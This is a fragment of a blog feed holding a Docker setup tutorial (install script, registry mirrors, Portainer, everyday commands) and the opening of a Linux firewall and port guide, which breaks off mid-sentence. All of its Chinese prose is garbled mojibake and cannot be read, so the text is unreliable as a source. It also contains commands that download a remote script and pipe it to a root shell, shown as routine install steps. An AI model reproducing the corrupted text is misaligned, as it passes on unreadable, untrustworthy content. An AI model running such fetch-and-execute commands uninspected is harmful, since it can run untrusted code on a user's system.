        <content type="html"><![CDATA[<p><img src="/2020/02/02/Server_Docker/docker.gif" alt="dockerå›¾æ ‡"></p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><blockquote><p>Building and deploying new applications is faster with containers.<br>Docker containers wrap up software and its dependencies into a  standardized unit for software development that includes everything it  needs to run: code, runtime, system tools and libraries. This guarantees that your application will always run the same and makes collaboration  as simple as sharing a container image.</p></blockquote><blockquote><p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼ŒåŸºäº Go è¯­è¨€ å¹¶éµä» Apache2.0 åè®®å¼€æºã€‚</p><p>Docker å¯ä»¥è®©å¼€å‘è€…æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªè½»é‡çº§ã€å¯ç§»æ¤çš„å®¹å™¨ä¸­ï¼Œç„¶åå‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœºå™¨ä¸Šï¼Œä¹Ÿå¯ä»¥å®ç°è™šæ‹ŸåŒ–ã€‚</p><p>å®¹å™¨æ˜¯å®Œå…¨ä½¿ç”¨æ²™ç®±æœºåˆ¶ï¼Œç›¸äº’ä¹‹é—´ä¸ä¼šæœ‰ä»»ä½•æ¥å£ï¼ˆç±»ä¼¼ iPhone çš„ appï¼‰,æ›´é‡è¦çš„æ˜¯å®¹å™¨æ€§èƒ½å¼€é”€æä½ã€‚</p></blockquote><p>å…¶å®æ„Ÿè§‰ä¸Šå°±æ˜¯emmm</p><p>åˆ«äººæŠŠæ•´å¥—ç¯å¢ƒéƒ½é…ç½®å¥½æ‰“åŒ…å¥½äº†ï¼Œä½ ç›´æ¥æ‹¿è¿‡æ¥ç”¨å°±å¥½äº†ï¼</p><p>åæ­£ç”¨èµ·æ¥è´¼æ–¹ä¾¿å°±æ˜¯äº†ã€‚</p><p><img src="/2020/02/02/Server_Docker/docker2.png" alt="å›¾æ ‡"></p><p>æ„Ÿè§‰dockerçš„å›¾æ ‡å°±æŒºå¥½çœ‹çš„ï¼ˆ</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -fsSL get.docker.com -o get-docker.sh<span class="token function">sudo</span> <span class="token function">sh</span> get-docker.sh --mirror Aliyun</code></pre><p>Windowsä¸‹ä¸‹è½½Docker Desktop</p><p><a href="https://www.docker.com/products/docker-desktop">https://www.docker.com/products/docker-desktop</a></p><p>ï¼ˆè¦ç™»é™†ï¼‰</p><h2 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h2><p>Linuxä¸‹ï¼Œç¼–è¾‘æ­¤æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ–°å»ºã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/docker/daemon.json</code></pre><p>Windowsä¸‹æ–‡ä»¶ä¸ºï¼š</p><pre class="language-none"><code class="language-none">%programdata%\docker\config\daemon.json</code></pre><h3 id="USTC-ä¸­ç§‘å¤§æºï¼ˆæ¨èï¼ï¼‰"><a href="#USTC-ä¸­ç§‘å¤§æºï¼ˆæ¨èï¼ï¼‰" class="headerlink" title="USTC ä¸­ç§‘å¤§æºï¼ˆæ¨èï¼ï¼‰"></a>USTC ä¸­ç§‘å¤§æº<strong>ï¼ˆæ¨èï¼ï¼‰</strong></h3><p><a href="https://lug.ustc.edu.cn/wiki/mirrors/help/docker">https://lug.ustc.edu.cn/wiki/mirrors/help/docker</a></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="Azure-ä¸­å›½é•œåƒ"><a href="#Azure-ä¸­å›½é•œåƒ" class="headerlink" title="Azure ä¸­å›½é•œåƒ"></a>Azure ä¸­å›½é•œåƒ</h3><p><a href="https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy">https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy</a></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"https://dockerhub.azk8s.cn"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="DaoCloud-æº"><a href="#DaoCloud-æº" class="headerlink" title="DaoCloud æº"></a>DaoCloud æº</h3><p><a href="https://www.daocloud.io/mirror">https://www.daocloud.io/mirror</a></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"http://f1361db2.m.daocloud.io"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>æˆ–è€… ç›´æ¥æ‰§è¡Œè¿™ä¸ªå°±å¯ä»¥ä¸€é”®ä¿®æ”¹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -sSL https://get.daocloud.io/daotools/set_mirror.sh <span class="token operator">|</span> <span class="token function">sh</span> -s http://f1361db2.m.daocloud.io</code></pre><h3 id="163ç½‘æ˜“æº"><a href="#163ç½‘æ˜“æº" class="headerlink" title="163ç½‘æ˜“æº"></a>163ç½‘æ˜“æº</h3><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="é˜¿é‡Œæº"><a href="#é˜¿é‡Œæº" class="headerlink" title="é˜¿é‡Œæº"></a>é˜¿é‡Œæº</h3><p>è¦æ³¨å†Œï¼Œç•¥ã€‚</p><h3 id="é…ç½®å¤šä¸ªé•œåƒ"><a href="#é…ç½®å¤šä¸ªé•œåƒ" class="headerlink" title="é…ç½®å¤šä¸ªé•œåƒ"></a>é…ç½®å¤šä¸ªé•œåƒ</h3><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"registry-mirrors"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">,</span>    <span class="token string">"https://dockerhub.azk8s.cn/"</span><span class="token punctuation">,</span>    <span class="token string">"http://hub-mirror.c.163.com"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>æ³¨æ„éµå¾ª<code>json</code>æ ¼å¼ã€‚</p><h3 id="é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡"><a href="#é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡" class="headerlink" title="é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡"></a>é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker</code></pre><h3 id="æ£€æŸ¥åŠ é€Ÿå™¨æ˜¯å¦ç”Ÿæ•ˆ"><a href="#æ£€æŸ¥åŠ é€Ÿå™¨æ˜¯å¦ç”Ÿæ•ˆ" class="headerlink" title="æ£€æŸ¥åŠ é€Ÿå™¨æ˜¯å¦ç”Ÿæ•ˆ"></a>æ£€æŸ¥åŠ é€Ÿå™¨æ˜¯å¦ç”Ÿæ•ˆ</h3><pre class="language-bash" data-language="bash"><code class="language-bash">docker info</code></pre><p>æœ‰å¦‚ä¸‹ä¿¡æ¯åˆ™é…ç½®æˆåŠŸã€‚</p><p><img src="/2020/02/02/Server_Docker/mirror.png" alt="mirrors"></p><hr><h2 id="Portainer"><a href="#Portainer" class="headerlink" title="Portainer"></a>Portainer</h2><blockquote><p>Portainer æ˜¯ Docker çš„å›¾å½¢åŒ–ç®¡ç†å·¥å…·ï¼Œæä¾›çŠ¶æ€æ˜¾ç¤ºé¢æ¿ã€åº”ç”¨æ¨¡æ¿å¿«é€Ÿéƒ¨ç½²ã€å®¹å™¨é•œåƒç½‘ç»œæ•°æ®å·çš„åŸºæœ¬æ“ä½œï¼ˆåŒ…æ‹¬ä¸Šä¼ ä¸‹è½½é•œåƒï¼Œåˆ›å»ºå®¹å™¨ç­‰æ“ä½œï¼‰ã€äº‹ä»¶æ—¥å¿—æ˜¾ç¤ºã€å®¹å™¨æ§åˆ¶å°æ“ä½œã€Swarmé›†ç¾¤å’ŒæœåŠ¡ç­‰é›†ä¸­ç®¡ç†å’Œæ“ä½œã€ç™»å½•ç”¨æˆ·ç®¡ç†å’Œæ§åˆ¶ç­‰åŠŸèƒ½ã€‚åŠŸèƒ½ååˆ†å…¨é¢ï¼ŒåŸºæœ¬èƒ½æ»¡è¶³ä¸­å°å‹å•ä½å¯¹å®¹å™¨ç®¡ç†çš„å…¨éƒ¨éœ€æ±‚ã€‚</p></blockquote><h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ‹‰å–é•œåƒ</span>docker pull portainer/portainer<span class="token comment"># ä¸€é”®éƒ¨ç½²</span>docker volume create portainer_datadocker run -d -p <span class="token number">9000</span>:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer</code></pre><p>è®¿é—® <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000</a> å³å¯è®¿é—®å›¾å½¢åŒ–é¢æ¿ã€‚é…ç½®å¥½ç”¨æˆ·åã€å¯†ç åç™»å½•ã€‚</p><p><img src="/2020/02/02/Server_Docker/portainer.png" alt="ç™»å½•ç•Œé¢"></p><p>è¿æ¥åˆ°Localï¼Œç™»å½•åçš„ä¸»ç•Œé¢å¦‚ä¸‹ã€‚</p><p><img src="/2020/02/02/Server_Docker/portainer2.png" alt="Home"></p><h3 id="é€šè¿‡è¿œç¨‹è®¿é—®"><a href="#é€šè¿‡è¿œç¨‹è®¿é—®" class="headerlink" title="é€šè¿‡è¿œç¨‹è®¿é—®"></a>é€šè¿‡è¿œç¨‹è®¿é—®</h3><p>éœ€è¦åœ¨é˜²ç«å¢™æ”¾è¡Œ9000ç«¯å£ã€‚</p><p>Ubuntu:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ufw allow <span class="token number">9000</span>  </code></pre><p>CentOS:ï¼ˆå…¶å®ä¹Ÿå¯ä»¥è£…ä¸ª ufw çš„ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">9000</span>/tcp --permanent  <span class="token comment"># å¼€æ”¾ç«¯å£</span><span class="token function">sudo</span> systemctl restart firewalld.service    <span class="token comment"># é‡å¯firewall</span></code></pre><h3 id="å¼€æœºè‡ªå¯"><a href="#å¼€æœºè‡ªå¯" class="headerlink" title="å¼€æœºè‡ªå¯"></a>å¼€æœºè‡ªå¯</h3><pre class="language-bash" data-language="bash"><code class="language-bash">docker update --restart<span class="token operator">=</span>always portainer</code></pre><p>å…¶å®åœ¨ä¸Šé¢çš„ä¸€é”®éƒ¨ç½²å‘½ä»¤ä¸­å·²ç»åŠ äº†ï¼Œè¿™é‡Œä¸éœ€è¦äº†ã€‚ï¼ˆè®°å½•ä¸€ä¸‹è€Œå·²ï¼‰</p><hr><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><h3 id="ç³»ç»Ÿç›¸å…³"><a href="#ç³»ç»Ÿç›¸å…³" class="headerlink" title="ç³»ç»Ÿç›¸å…³"></a>ç³»ç»Ÿç›¸å…³</h3><h4 id="æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯"><a href="#æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯"></a>æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker info</code></pre><h4 id="æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´"><a href="#æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´" class="headerlink" title="æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´"></a>æŸ¥çœ‹é•œåƒã€å®¹å™¨ã€æ•°æ®å·æ‰€å ç”¨çš„ç©ºé—´</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker system <span class="token function">df</span></code></pre><hr><h3 id="å®¹å™¨ç›¸å…³"><a href="#å®¹å™¨ç›¸å…³" class="headerlink" title="å®¹å™¨ç›¸å…³"></a>å®¹å™¨ç›¸å…³</h3><h4 id="æŸ¥çœ‹å½“å‰å®¹å™¨"><a href="#æŸ¥çœ‹å½“å‰å®¹å™¨" class="headerlink" title="æŸ¥çœ‹å½“å‰å®¹å™¨"></a>æŸ¥çœ‹å½“å‰å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token function">ps</span> -a</code></pre><p>æœ‰<code>-a</code>åˆ™æ˜¾ç¤ºæ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬å¯åŠ¨çš„å’Œæœªå¯åŠ¨çš„ã€‚æ²¡æœ‰<code>-a</code>çš„è¯åˆ™åªæ˜¾ç¤ºè¿è¡Œç€çš„ã€‚</p><h4 id="åˆ›å»º-amp-ä½¿ç”¨å®¹å™¨"><a href="#åˆ›å»º-amp-ä½¿ç”¨å®¹å™¨" class="headerlink" title="åˆ›å»º&amp;ä½¿ç”¨å®¹å™¨"></a>åˆ›å»º&amp;ä½¿ç”¨å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker run -it --name å®¹å™¨å é•œåƒå/é•œåƒID /bin/bash</code></pre><p>ä½¿ç”¨ <code>-d</code> å‚æ•°è¿è¡Œå®¹å™¨ï¼Œå¯ä»¥è®©å®¹å™¨åœ¨åå°è¿è¡Œè€Œä¸æŠŠSTDOUTè¾“å‡ºåˆ°å®¿ä¸»æœºä¸Šã€‚</p><p>ï¼ˆç”¨<code>docker logs [container ID or NAMES]</code>æŸ¥çœ‹ï¼‰</p><p>å½“ <code>-i</code> <code>-t</code> å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¯ä»¥çœ‹åˆ° Linux å‘½ä»¤æç¤ºç¬¦ï¼Œå¦‚<code>root@69d137adef7a:/#</code>ã€‚åªæœ‰ <code>-i</code>åˆ™æ²¡æœ‰å‘½ä»¤æç¤ºç¬¦ã€‚</p><h4 id="å¯åŠ¨å®¹å™¨"><a href="#å¯åŠ¨å®¹å™¨" class="headerlink" title="å¯åŠ¨å®¹å™¨"></a>å¯åŠ¨å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker start å®¹å™¨å/å®¹å™¨ID</code></pre><h4 id="é‡å¯å®¹å™¨"><a href="#é‡å¯å®¹å™¨" class="headerlink" title="é‡å¯å®¹å™¨"></a>é‡å¯å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker restart å®¹å™¨å/å®¹å™¨ID</code></pre><h4 id="ç»ˆæ­¢å®¹å™¨"><a href="#ç»ˆæ­¢å®¹å™¨" class="headerlink" title="ç»ˆæ­¢å®¹å™¨"></a>ç»ˆæ­¢å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker stop å®¹å™¨å/å®¹å™¨ID</code></pre><h4 id="æŸ¥çœ‹å®¹å™¨ä¿¡æ¯"><a href="#æŸ¥çœ‹å®¹å™¨ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹å®¹å™¨ä¿¡æ¯"></a>æŸ¥çœ‹å®¹å™¨ä¿¡æ¯</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker container <span class="token function">ls</span> -a</code></pre><h4 id="å®¹å™¨ç»Ÿè®¡ä¿¡æ¯"><a href="#å®¹å™¨ç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="å®¹å™¨ç»Ÿè®¡ä¿¡æ¯"></a>å®¹å™¨ç»Ÿè®¡ä¿¡æ¯</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker stats</code></pre><h4 id="å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨"><a href="#å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨" class="headerlink" title="å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨"></a>å¯åŠ¨å·²ç»ˆæ­¢å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker container start</code></pre><h4 id="è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯"><a href="#è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯" class="headerlink" title="è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯"></a>è·å–å®¹å™¨çš„è¾“å‡ºä¿¡æ¯</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker container logs <span class="token punctuation">[</span>container ID or NAMES<span class="token punctuation">]</span></code></pre><h4 id="è¿›å…¥å®¹å™¨ï¼ˆè¿æ¥å®¹å™¨ï¼‰"><a href="#è¿›å…¥å®¹å™¨ï¼ˆè¿æ¥å®¹å™¨ï¼‰" class="headerlink" title="è¿›å…¥å®¹å™¨ï¼ˆè¿æ¥å®¹å™¨ï¼‰"></a>è¿›å…¥å®¹å™¨ï¼ˆè¿æ¥å®¹å™¨ï¼‰</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token builtin class-name">exec</span> -it å®¹å™¨å/å®¹å™¨ID /bin/bash</code></pre><p>ä»è¿™ä¸ª stdin ä¸­ exitï¼Œä¸ä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚<strong>ï¼ˆæ¨èâ†‘ï¼‰</strong></p><p>è€Œä¸‹é¢è¿™ä¸ªï¼Œä»è¿™ä¸ª stdin ä¸­ exitï¼Œä¼šå¯¼è‡´å®¹å™¨çš„åœæ­¢ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker attach å®¹å™¨å/å®¹å™¨ID</code></pre><h4 id="åˆ é™¤å®¹å™¨"><a href="#åˆ é™¤å®¹å™¨" class="headerlink" title="åˆ é™¤å®¹å™¨"></a>åˆ é™¤å®¹å™¨</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token function">rm</span> å®¹å™¨å/å®¹å™¨ID</code></pre><hr><h3 id="é•œåƒç›¸å…³"><a href="#é•œåƒç›¸å…³" class="headerlink" title="é•œåƒç›¸å…³"></a>é•œåƒç›¸å…³</h3><h4 id="æœç´¢é•œåƒ"><a href="#æœç´¢é•œåƒ" class="headerlink" title="æœç´¢é•œåƒ"></a>æœç´¢é•œåƒ</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker search å…³é”®è¯</code></pre><h4 id="ä¸‹è½½é•œåƒ"><a href="#ä¸‹è½½é•œåƒ" class="headerlink" title="ä¸‹è½½é•œåƒ"></a>ä¸‹è½½é•œåƒ</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker pull é•œåƒå</code></pre><p><code>é•œåƒå:Tag</code> å¯ä»¥ä¸‹è½½ä¸åŒæ ‡ç­¾çš„é•œåƒã€‚</p><h4 id="æŸ¥çœ‹å·²ä¸‹è½½é•œåƒ"><a href="#æŸ¥çœ‹å·²ä¸‹è½½é•œåƒ" class="headerlink" title="æŸ¥çœ‹å·²ä¸‹è½½é•œåƒ"></a>æŸ¥çœ‹å·²ä¸‹è½½é•œåƒ</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker images -a<span class="token comment"># æˆ–è€… docker image ls</span></code></pre><h4 id="åˆ é™¤é•œåƒ"><a href="#åˆ é™¤é•œåƒ" class="headerlink" title="åˆ é™¤é•œåƒ"></a>åˆ é™¤é•œåƒ</h4><pre class="language-bash" data-language="bash"><code class="language-bash">docker rmi <span class="token punctuation">[</span>Image ID<span class="token punctuation">]</span></code></pre><hr><h3 id="ç«¯å£ç›¸å…³"><a href="#ç«¯å£ç›¸å…³" class="headerlink" title="ç«¯å£ç›¸å…³"></a>ç«¯å£ç›¸å…³</h3><h4 id="ç«¯å£æ˜ å°„"><a href="#ç«¯å£æ˜ å°„" class="headerlink" title="ç«¯å£æ˜ å°„"></a>ç«¯å£æ˜ å°„</h4><p>å°†dockerå†…çš„80ç«¯å£æ˜ å°„åˆ°å®¿ä¸»æœºçš„8000ç«¯å£ä¸Š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å¯ä»¥ä½¿ç”¨--nameè‡ªå®šä¹‰éƒ¨ç½²çš„å®¹å™¨å</span>docker run -d -p <span class="token number">8000</span>:80 --name å®¹å™¨å é•œåƒå<span class="token comment"># ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡é•œåƒéƒ¨ç½²</span>docker run -d -p <span class="token number">8000</span>:80 é•œåƒå</code></pre><p><em>ï¼ˆåˆ«æ€¥ï¼Œæ…¢æ…¢å­¦å¥½äº†å•¦â€¦â€¦</em></p><hr><h2 id="æ‹“å±•é˜…è¯»"><a href="#æ‹“å±•é˜…è¯»" class="headerlink" title="æ‹“å±•é˜…è¯»"></a>æ‹“å±•é˜…è¯»</h2><p><strong>Dockerä»å…¥é—¨åˆ°å®è·µ GitBook</strong>  <a href="https://yeasy.gitbooks.io/docker_practice/content/">https://yeasy.gitbooks.io/docker_practice/content/</a></p><p>Docker-é•œåƒå¸¸ç”¨å‘½ä»¤ <a href="https://blog.csdn.net/y472360651/article/details/81289088">https://blog.csdn.net/y472360651/article/details/81289088</a></p><p>Dockeræ¸©æ•…çŸ¥æ–° <a href="https://www.sqlsec.com/2019/10/docker2.html">https://www.sqlsec.com/2019/10/docker2.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> Docker </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Firewall &amp; Port Configuration</title>
      <link href="2020/01/29/Server_firewall/"/>
      <url>2020/01/29/Server_firewall/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨é…æœåŠ¡å™¨ç¯å¢ƒçš„æ—¶å€™ï¼ŒåŠ¨ä¸åŠ¨é‡åˆ°ç«¯å£æ— æ³•è®¿é—®çš„æƒ…å†µï¼ŒæŠ˜è…¾äº†è€åŠå¤©ï¼Œç»è¿‡åˆ†æåˆ¤æ–­æœ€ååŸºæœ¬æ˜¯é˜²ç«å¢™æŠŠç½‘ç»œç«¯å£ç»™æ‹¦äº†â€¦â€¦</p><p>äºæ˜¯å°±æ¥ç®€è¦è®°å½•ä¸€ä¸‹Linuxä¸‹çš„é˜²ç«å¢™é…ç½®ï¼Œä»¥åŠç«¯å£å¼€æ”¾ã€å…³é—­çš„é…ç½®æ–¹æ³•ã€‚</p><p>æ•´ç†è‡ªç½‘ç»œå•¦ã€‚</p><hr><h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><p>CentOSä¸‹ç”¨çš„æ˜¯<code>firewall-cmd</code></p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><h4 id="å¯åŠ¨firewall"><a href="#å¯åŠ¨firewall" class="headerlink" title="å¯åŠ¨firewall"></a>å¯åŠ¨firewall</h4><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl start firewalld.service</code></pre><h4 id="å¼€æœºè‡ªå¯firewall"><a href="#å¼€æœºè‡ªå¯firewall" class="headerlink" title="å¼€æœºè‡ªå¯firewall"></a>å¼€æœºè‡ªå¯firewall</h4><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> firewalld.service</code></pre><h4 id="æŸ¥çœ‹å¼€æœºè‡ªå¯æ˜¯å¦è®¾ç½®æˆåŠŸ"><a href="#æŸ¥çœ‹å¼€æœºè‡ªå¯æ˜¯å¦è®¾ç½®æˆåŠŸ" class="headerlink" title="æŸ¥çœ‹å¼€æœºè‡ªå¯æ˜¯å¦è®¾ç½®æˆåŠŸ"></a>æŸ¥çœ‹å¼€æœºè‡ªå¯æ˜¯å¦è®¾ç½®æˆåŠŸ</h4><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl is-enabled firewalld.service<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token variable">$?</span></code></pre><blockquote><p>è¿”å›å¦‚ä¸‹åˆ™å¼€å¯æˆåŠŸ</p><pre class="language-none"><code class="language-none">&gt;enabled&gt;0</code></pre></blockquote><h4 id="é‡å¯firewall"><a href="#é‡å¯firewall" class="headerlink" title="é‡å¯firewall"></a>é‡å¯firewall</h4><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl restart firewalld.service</code></pre><h4 id="å…³é—­firewall"><a href="#å…³é—­firewall" class="headerlink" title="å…³é—­firewall"></a>å…³é—­firewall</h4><pre class="language-bash" data-language="bash"><code class="language-bash">systemctl stop firewalld.service</code></pre><h4 id="æ£€æµ‹firewallçŠ¶æ€"><a href="#æ£€æµ‹firewallçŠ¶æ€" class="headerlink" title="æ£€æµ‹firewallçŠ¶æ€"></a>æ£€æµ‹firewallçŠ¶æ€</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --state</code></pre><blockquote><p>ä¾‹å¦‚æ­£åœ¨è¿è¡Œï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># firewall-cmd --state</span>running</code></pre><p>ä¸åœ¨è¿è¡Œåˆ™ä¸º<code>not running</code></p></blockquote><h3 id="ç«¯å£é…ç½®"><a href="#ç«¯å£é…ç½®" class="headerlink" title="ç«¯å£é…ç½®"></a>ç«¯å£é…ç½®</h3><h4 id="æŸ¥çœ‹å¼€æ”¾ï¼ˆç›‘å¬ï¼‰çš„ç«¯å£"><a href="#æŸ¥çœ‹å¼€æ”¾ï¼ˆç›‘å¬ï¼‰çš„ç«¯å£" class="headerlink" title="æŸ¥çœ‹å¼€æ”¾ï¼ˆç›‘å¬ï¼‰çš„ç«¯å£"></a>æŸ¥çœ‹å¼€æ”¾ï¼ˆç›‘å¬ï¼‰çš„ç«¯å£</h4><pre class="language-bash" data-language="bash"><code class="language-bash">firewall-cmd --list-ports</code></pre><blockquote><p>exampleï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># firewall-cmd --list-ports</span><span class="token number">80</span>/tcp <span class="token number">7650</span>/tcp <span class="token number">3306</span>/tcp</code></pre><p>æˆ–</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> -ntlp</code></pre><blockquote><p>å¦‚æœæ²¡æœ‰çš„è¯ï¼ˆ<em>centos7é»˜è®¤æ²¡æœ‰ netstat å‘½ä»¤</em>ï¼‰ï¼Œå…ˆå®‰è£…<code>net-tools</code>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span>yum <span class="token function">install</span> -y net-tools</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># netstat -ntlp</span><span class="token operator">&gt;</span>Active Internet connections <span class="token punctuation">(</span>only servers<span class="token punctuation">)</span><span class="token operator">&gt;</span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<span class="token operator">&gt;</span>tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:3306            <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">14301</span>/mysqld<span class="token operator">&gt;</span>tcp        <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">0.0</span>.0.0:22              <span class="token number">0.0</span>.0.0:*               LISTEN      <span class="token number">1840</span>/sshd<span class="token operator">&gt;</span>tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::6011                 :::*                    LISTEN      <span class="token number">8037</span>/sshd: root@pts<span class="token operator">&gt;</span>tcp6       <span class="token number">0</span>      <span class="token number">0</span> :::22                   :::*                    LISTEN      <span class="token number">1840</span>/sshd<span class="token operator">&gt;</span>â€¦â€¦</code></pre><p>å…¶ä¸­<code>tcp</code>ä¸ºipv4ï¼Œ<code>tcp6</code>ä¸ºipv6.</p></blockquote><p>é‡åˆ°è¿‡å‡ 